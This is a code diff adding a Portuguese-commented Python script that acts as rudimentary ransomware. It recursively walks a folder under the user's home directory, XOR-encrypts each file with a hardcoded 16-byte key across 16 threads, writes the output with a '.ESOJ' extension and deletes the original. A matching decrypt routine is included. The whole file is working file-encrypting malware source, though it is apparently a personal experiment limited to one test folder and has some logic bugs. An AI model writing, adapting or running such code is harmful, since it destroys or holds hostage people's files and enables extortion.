@@ -1,0 +1,170 @@
+#A MESMA MERDA SO Q EM PYTHON
+
+import secrets
+import struct
+import os
+import time
+tamanhoBloco=16 #2**256 key lenght
+tamanhoBuffer=4096 # é bom q seja multiplo de 16 , 256 conjuntos de blocos de 16(tamanho da chave)
+tamanhoBufferEmBlocos=tamanhoBuffer//tamanhoBloco
+
+def gerarChaveXor(tamanhoBytesChave):
+    chave=[]
+    for i in range(tamanhoBloco):
+        chave.append(secrets.randbelow(2**8))
+    return chave
+
+def CifrarBloco(dado,chave,tamanhoBloco):
+    "Dado tem tamanho 16 bytes ou menos"
+    saida=[]
+    for i in range(len(dado)):
+        saida.append(dado[i]^chave[i])
+    return saida
+
+    
+
+def encriptar(nomeArquivo,chave):
+
+    print("encriptando :%s"%nomeArquivo)
+    file=open(nomeArquivo,"br")
+    fd_saida= open(nomeArquivo+".ESOJ",'wb')
+    lido=b'ffffff'
+    buffer=[]
+    while(1):
+        for i in range(tamanhoBufferEmBlocos):
+            if len(lido)>0:
+                lido=file.read(tamanhoBloco)
+                buffer+=CifrarBloco(lido,chave,tamanhoBloco)
+            if len(lido)<=tamanhoBloco:
+                break
+        EscreverBinario(buffer,fd_saida)
+        buffer=[]
+
+        if len(lido)!=tamanhoBloco:
+            break
+
+    fd_saida.close()
+    file.close()
+    os.remove(nomeArquivo)
+    return 0
+
+
+def desencriptar(nomeArquivo,chave):
+    bloquito=len(chave)
+    dado=[0]*bloquito
+    file=open(nomeArquivo,"br")
+    fd_saida= open(nomeArquivo[:-5],'wb')
+    while(1):
+        bytesList=file.read(tamanhoBloco)
+        cifrado=CifrarBloco(bytesList,chave,tamanhoBloco)
+        EscreverBinario(cifrado,fd_saida)
+        if len(bytesList)<tamanhoBloco:
+            break
+    fd_saida.close()
+    file.close()
+    os.remove(nomeArquivo)
+    return 0
+
+
+def EscreverBinario(inteiroLista,fdArquivo):
+    "Escreve n bytes de uma lista de decimais dentro de um arquivo"
+    #print (inteiroLista)
+    
+    #[1-byte ]...
+    for i in inteiroLista:
+        #print ("trying to pack ",i)
+        entry = struct.pack('@B',i) #unsigned char
+        fdArquivo.write(entry)
+        fdArquivo.flush()
+
+from threading import Thread
+
+
+
+def recursaoEncriptar():
+    
+    numeroThreads=16
+    threadList=[]
+    
+    # The top argument for walk
+    topdir = (os.environ['HOME'])
+    #listaDir=[topdir+'\\Documents',topdir+'\\Downloads',topdir+'\\Desktop']
+    listaDir=[topdir+'\\Documents\\kali']
+    #print(listaDir)
+     
+    # The extension to search for
+    for j in listaDir:
+        externList=['.jpg','.jpeg','.pdf','.doc','.mp3','.mp4']
+        #print (i) 
+        for dirpath, dirnames, files in os.walk(j):
+            #for name in files:
+            for i in range(len(files)):
+                if len(files)==0:
+                    break
+                filename, file_extension = os.path.splitext(files[i])
+                #if file_extension in externList:
+                #print("encriptado T1%s"%files[i])
+                
+                for numeroT in range(numeroThreads):
+                    if len(files)==0:
+                        break
+                    print("inciando numeroT thread %i\n"%numeroT)
+                    threadList.append(Thread(target=encriptar,args=(os.path.join(dirpath, files[-1]),chave)))
+                    threadList[-1].start()
+                    del files[-1]
+
+
+                for thread3 in threadList:
+                    if len(files)==0:
+                        break
+                    if not(thread3.is_alive()):
+                        
+                        thread = Thread(target=encriptar,args=(os.path.join(dirpath, files[-1]),chave))
+                        del files[-1]
+                    
+                for threadzao in threadList:
+                    threadzao.join()
+                print("todos os thread concluidos")
+                
+                
+                #8 threads de criptografia
+                #if os.stat(os.path.join(dirpath, files[i])).st_size < 10000000:
+                #    thread1 = Thread(target=encriptar,args=(os.path.join(dirpath, files[i]),chave))
+                #    thread1.start()
+
+                #for k in range(numeroThreads):
+                #    print("Comecando thread %i"%k)
+                #    threadList=[]
+                #    if(i+k<len(files)):
+                        
+                        #if os.stat(os.path.join(dirpath, files[i+k])).st_size<10000000:
+                #        threadList.append(Thread(target=encriptar,args=(os.path.join(dirpath, files[i+k]),chave)))
+                        #print("trhead %i"%k,threadList[-1])
+                #        threadList[-1].start()
+                            
+                #loop=0           
+                #for t in threadList:                            
+                #    t.join()
+                #print("fim dos threads llop%i",loop)
+                #loop+=1
+    #print (chave)
+        
+        
+                
+
+
+#chave=gerarChaveXor(tamanhoBloco)
+chave=[84, 138, 143, 186, 14, 205, 23, 251, 202, 117, 66, 68, 175, 153, 206, 15]
+time0=time.time()
+recursaoEncriptar()
+#print ("chave\t\t",chave)
+#encriptar("eneas.mp4",chave)
+#tempo=time.time()-time0
+#print ("tepo total 6,22mb %i"%tempo)
+#print("velocidade=%f",6.22/tempo)
+#
+#encriptar("teste.txt",chave)
+#desencriptar("teste.txt",chave)
+
+
+
